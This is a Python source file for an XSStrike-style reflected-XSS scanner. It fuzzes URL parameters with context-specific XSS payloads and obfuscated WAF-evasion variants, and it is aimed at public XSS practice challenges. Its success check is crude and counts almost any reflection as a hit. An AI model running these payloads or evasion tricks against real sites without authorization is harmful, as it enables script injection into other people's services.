#!/usr/bin/env python3
"""
Enhanced XSS Scanner - Inspired by XSStrike methodology
Key improvements:
1. Context-aware payload generation (like XSStrike)
2. Intelligent response parsing 
3. WAF detection and evasion
4. Blind XSS integration
5. Advanced fuzzing engine
"""

import asyncio
import aiohttp
import re
import urllib.parse
import json
import time
from bs4 import BeautifulSoup
from typing import List, Dict, Any

class ContextAnalyzer:
    """Analyzes injection context like XSStrike's parsers"""
    
    def __init__(self):
        self.contexts = []
    
    def analyze_reflection(self, payload: str, response: str) -> Dict[str, Any]:
        """Analyze where and how payload is reflected"""
        contexts = []
        
        # Find all occurrences of payload
        payload_positions = []
        start = 0
        while True:
            pos = response.find(payload, start)
            if pos == -1:
                break
            payload_positions.append(pos)
            start = pos + 1
        
        for pos in payload_positions:
            # Extract context around payload
            context_start = max(0, pos - 100)
            context_end = min(len(response), pos + len(payload) + 100)
            context = response[context_start:context_end]
            
            # Determine injection context type
            context_type = self._determine_context_type(context, payload, pos - context_start)
            contexts.append({
                'type': context_type,
                'context': context,
                'position': pos,
                'payload': payload
            })
        
        return {
            'contexts': contexts,
            'reflection_count': len(payload_positions),
            'exploitable': any(ctx['type'] in ['script', 'attribute', 'html'] for ctx in contexts)
        }
    
    def _determine_context_type(self, context: str, payload: str, payload_pos: int) -> str:
        """Determine the type of injection context"""
        # Extract text before and after payload
        before = context[:payload_pos].lower()
        after = context[payload_pos + len(payload):].lower()
        
        # Script context
        if '<script' in before and '</script>' in after:
            return 'script'
        
        # Attribute context
        if self._is_in_attribute(before, after):
            return 'attribute'
        
        # HTML context
        if '<' in before or '>' in after:
            return 'html'
        
        # JavaScript variable context
        if any(js_pattern in before for js_pattern in ['var ', 'let ', 'const ', '=']):
            return 'javascript_var'
        
        # CSS context
        if '<style' in before and '</style>' in after:
            return 'css'
        
        # Comment context
        if '<!--' in before and '-->' in after:
            return 'comment'
        
        return 'text'
    
    def _is_in_attribute(self, before: str, after: str) -> bool:
        """Check if payload is inside an HTML attribute"""
        # Look for attribute patterns
        attr_patterns = [
            r'[\w-]+\s*=\s*["\']?[^"\']*$',  # attribute="value
            r'^\s*[^"\']*["\']?[\s>]'        # value" or value'>
        ]
        
        before_match = any(re.search(pattern, before) for pattern in attr_patterns[:1])
        after_match = any(re.search(pattern, after) for pattern in attr_patterns[1:])
        
        return before_match or after_match

class PayloadGenerator:
    """Context-aware payload generator inspired by XSStrike"""
    
    def __init__(self):
        self.payloads = {
            'script': [
                '</script><script>alert(1)</script>',
                '</script><script>alert(String.fromCharCode(88,83,83))</script>',
                '</script><svg/onload=alert(1)>',
                '</ScRiPt><ScRiPt>alert(1)</ScRiPt>',
            ],
            'attribute': [
                '" onerror="alert(1)" x="',
                "' onerror='alert(1)' x='",
                '" onload="alert(1)" x="',
                '" onclick="alert(1)" x="',
                '" onfocus="alert(1)" x="',
                '" onmouseover="alert(1)" x="',
                '"><script>alert(1)</script><input x="',
                "'><script>alert(1)</script><input x='",
            ],
            'html': [
                '<script>alert(1)</script>',
                '<img src=x onerror=alert(1)>',
                '<svg onload=alert(1)>',
                '<iframe src=javascript:alert(1)>',
                '<body onload=alert(1)>',
                '<input onfocus=alert(1) autofocus>',
                '<select onfocus=alert(1) autofocus><option>',
                '<textarea onfocus=alert(1) autofocus>',
                '<keygen onfocus=alert(1) autofocus>',
                '<video onerror=alert(1)><source>',
                '<audio onerror=alert(1)><source>',
            ],
            'javascript_var': [
                ';alert(1);//',
                '";alert(1);//',
                "';alert(1);//",
                '}alert(1)//',
                ')alert(1)//',
                '"+alert(1)+"',
                "'+alert(1)+'",
                '*alert(1)*',
                '/alert(1)/',
                '%22);alert(1);//',
                '%27);alert(1);//',
            ],
            'css': [
                '</style><script>alert(1)</script>',
                '/*</style><script>alert(1)</script>',
                'expression(alert(1))',
                'url("javascript:alert(1)")',
            ],
            'comment': [
                '--><script>alert(1)</script><!--',
                '--!><script>alert(1)</script><!--',
            ],
            'generic': [
                # Multi-context payloads that work in various situations
                'javascript:alert(1)',
                'data:text/html,<script>alert(1)</script>',
                '"><script>alert(1)</script>',
                "'><script>alert(1)</script>",
                '<ScRiPt>alert(1)</ScRiPt>',
                '<IMG SRC=# onerror=alert(1)>',
                '<svg/onload=alert(1)>',
                '<iframe src=javascript:alert(1)>',
                '&#60;script&#62;alert(1)&#60;/script&#62;',
                '%3Cscript%3Ealert(1)%3C/script%3E',
            ]
        }
        
        # WAF evasion payloads
        self.evasion_payloads = [
            '<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>',
            '<script>eval(atob("YWxlcnQoMSk="))</script>',
            '<script>Function("alert(1)")()</script>',
            '<script>setTimeout(alert,0,1)</script>',
            '<script>setInterval(alert,100,1)</script>',
            '<script>[].constructor.constructor("alert(1)")()</script>',
            '<script>top.alert(1)</script>',
            '<script>parent.alert(1)</script>',
            '<script>self.alert(1)</script>',
            '<script>(alert)(1)</script>',
            '<script>alert.call(null,1)</script>',
            '<script>alert.apply(null,[1])</script>',
            '<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>',
            '<svg onload=eval(atob("YWxlcnQoMSk="))>',
        ]
    
    def generate_payloads_for_context(self, context_type: str) -> List[str]:
        """Generate payloads specific to injection context"""
        if context_type in self.payloads:
            return self.payloads[context_type] + self.payloads['generic']
        return self.payloads['generic']
    
    def generate_evasion_payloads(self) -> List[str]:
        """Generate WAF evasion payloads"""
        return self.evasion_payloads

class EnhancedXSSScanner:
    """Enhanced XSS Scanner with XSStrike-inspired techniques"""
    
    def __init__(self):
        self.context_analyzer = ContextAnalyzer()
        self.payload_generator = PayloadGenerator()
        self.findings = []
        self.tested_payloads = set()
    
    async def scan_url(self, url: str, parameters: List[str] = None) -> List[Dict]:
        """Comprehensive XSS scan of a URL"""
        print(f"🎯 Enhanced XSS Scan: {url}")
        
        if not parameters:
            parameters = await self._discover_parameters(url)
        
        async with aiohttp.ClientSession() as session:
            for param in parameters:
                await self._test_parameter(session, url, param)
        
        return self.findings
    
    async def _discover_parameters(self, url: str) -> List[str]:
        """Discover parameters through crawling and analysis"""
        # Parse URL for existing parameters
        from urllib.parse import urlparse, parse_qs
        parsed = urlparse(url)
        existing_params = list(parse_qs(parsed.query).keys())
        
        # Common parameter names to test
        common_params = [
            'q', 'query', 'search', 'keyword', 'term',
            'input', 'data', 'value', 'text', 'content',
            'name', 'title', 'description', 'comment',
            'id', 'user', 'username', 'email',
            'page', 'url', 'redirect', 'return',
            'lang', 'language', 'locale',
            'debug', 'test', 'demo'
        ]
        
        # Form parameter discovery
        form_params = await self._extract_form_parameters(url)
        
        all_params = list(set(existing_params + common_params + form_params))
        print(f"📊 Testing {len(all_params)} parameters: {all_params}")
        
        return all_params
    
    async def _extract_form_parameters(self, url: str) -> List[str]:
        """Extract parameters from HTML forms"""
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(url, timeout=10) as resp:
                    html = await resp.text()
                    soup = BeautifulSoup(html, 'html.parser')
                    
                    params = []
                    for form in soup.find_all('form'):
                        for inp in form.find_all(['input', 'textarea', 'select']):
                            name = inp.get('name')
                            if name:
                                params.append(name)
                    
                    return params
        except:
            return []
    
    async def _test_parameter(self, session: aiohttp.ClientSession, url: str, param: str):
        """Test a specific parameter for XSS"""
        print(f"🧪 Testing parameter: {param}")
        
        # Phase 1: Context discovery with simple payload
        discovery_payload = "xss_test_" + str(int(time.time()))
        context_info = await self._analyze_parameter_context(session, url, param, discovery_payload)
        
        if not context_info['contexts']:
            print(f"❌ Parameter {param} not reflected")
            return
        
        print(f"✅ Parameter {param} reflected in {len(context_info['contexts'])} contexts")
        
        # Phase 2: Context-specific payload testing
        for context in context_info['contexts']:
            await self._test_context_specific_payloads(session, url, param, context)
    
    async def _analyze_parameter_context(self, session: aiohttp.ClientSession, url: str, param: str, payload: str) -> Dict:
        """Analyze how a parameter is reflected to determine injection context"""
        test_url = self._build_test_url(url, param, payload)
        
        try:
            async with session.get(test_url, timeout=10) as resp:
                response_text = await resp.text()
                return self.context_analyzer.analyze_reflection(payload, response_text)
        except:
            return {'contexts': [], 'reflection_count': 0, 'exploitable': False}
    
    async def _test_context_specific_payloads(self, session: aiohttp.ClientSession, url: str, param: str, context: Dict):
        """Test payloads specific to the identified context"""
        context_type = context['type']
        print(f"🎯 Testing {context_type} context payloads")
        
        # Generate context-specific payloads
        payloads = self.payload_generator.generate_payloads_for_context(context_type)
        
        for payload in payloads:
            if payload in self.tested_payloads:
                continue
            
            self.tested_payloads.add(payload)
            
            test_url = self._build_test_url(url, param, payload)
            
            try:
                async with session.get(test_url, timeout=5) as resp:
                    response_text = await resp.text()
                    
                    # Check if payload is reflected in dangerous context
                    if await self._is_xss_successful(payload, response_text, context_type):
                        finding = {
                            'url': test_url,
                            'parameter': param,
                            'payload': payload,
                            'context_type': context_type,
                            'evidence': context['context'],
                            'confidence': self._calculate_confidence(payload, context_type),
                            'timestamp': time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime())
                        }
                        
                        self.findings.append(finding)
                        print(f"🔥 XSS FOUND: {payload[:50]}...")
                        print(f"   Context: {context_type}")
                        print(f"   URL: {test_url}")
                        
                        # If we found XSS, try WAF evasion variants
                        await self._test_evasion_variants(session, url, param, payload, context_type)
                        
                        return  # Found working payload for this context
                        
            except:
                continue
    
    async def _test_evasion_variants(self, session: aiohttp.ClientSession, url: str, param: str, base_payload: str, context_type: str):
        """Test WAF evasion variants of successful payload"""
        print("🛡️ Testing WAF evasion variants...")
        
        evasion_payloads = self.payload_generator.generate_evasion_payloads()
        
        for payload in evasion_payloads[:5]:  # Test top 5 evasion techniques
            test_url = self._build_test_url(url, param, payload)
            
            try:
                async with session.get(test_url, timeout=5) as resp:
                    response_text = await resp.text()
                    
                    if await self._is_xss_successful(payload, response_text, 'evasion'):
                        finding = {
                            'url': test_url,
                            'parameter': param,
                            'payload': payload,
                            'context_type': 'evasion',
                            'evidence': 'WAF evasion variant',
                            'confidence': 0.9,
                            'timestamp': time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime())
                        }
                        
                        self.findings.append(finding)
                        print(f"🛡️ WAF EVASION: {payload[:50]}...")
                        
            except:
                continue
    
    async def _is_xss_successful(self, payload: str, response: str, context_type: str) -> bool:
        """Determine if XSS payload was successfully executed"""
        # Check for payload reflection in dangerous contexts
        if payload not in response:
            return False
        
        # Context-specific success indicators
        success_indicators = {
            'script': ['<script', 'alert(', 'eval(', 'setTimeout('],
            'attribute': ['onerror=', 'onload=', 'onclick=', 'onfocus='],
            'html': ['<script', '<img', '<svg', '<iframe', 'onerror='],
            'javascript_var': ['alert(', ';alert', '"+alert', "'+alert"],
            'css': ['expression(', 'url("javascript:', '</style>'],
            'evasion': ['alert(', 'eval(', 'Function(', 'setTimeout(']
        }
        
        indicators = success_indicators.get(context_type, ['alert(', '<script'])
        
        return any(indicator in response for indicator in indicators)
    
    def _build_test_url(self, base_url: str, param: str, payload: str) -> str:
        """Build test URL with payload"""
        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
        
        parsed = urlparse(base_url)
        query_params = parse_qs(parsed.query)
        query_params[param] = [payload]
        
        new_query = urlencode(query_params, doseq=True)
        return urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment))
    
    def _calculate_confidence(self, payload: str, context_type: str) -> float:
        """Calculate confidence score for XSS finding"""
        base_confidence = 0.7
        
        # Higher confidence for specific contexts
        if context_type in ['script', 'attribute']:
            base_confidence = 0.9
        elif context_type in ['html', 'javascript_var']:
            base_confidence = 0.8
        
        # Adjust for payload complexity
        if 'alert(' in payload and ('<script>' in payload or 'onerror=' in payload):
            base_confidence += 0.1
        
        return min(1.0, base_confidence)

async def main():
    """Test the enhanced scanner"""
    scanner = EnhancedXSSScanner()
    
    # Test on our known targets
    test_targets = [
        'https://alf.nu/alert1?world=alert&level=alert1',
        'http://www.xssgame.com/f/m4KKGHi2rVUN/',
        'http://www.xssgame.com/f/u0hrDTsXmyVJ/',
    ]
    
    print("🚀 ENHANCED XSS SCANNER - XSStrike Inspired")
    print("=" * 60)
    
    for target in test_targets:
        print(f"\n🎯 Testing: {target}")
        results = await scanner.scan_url(target)
        
        if results:
            print(f"✅ Found {len(results)} XSS vulnerabilities!")
            for result in results:
                print(f"  • {result['context_type']}: {result['payload'][:50]}...")
        else:
            print("❌ No XSS found")
        
        print("-" * 50)

if __name__ == "__main__":
    asyncio.run(main())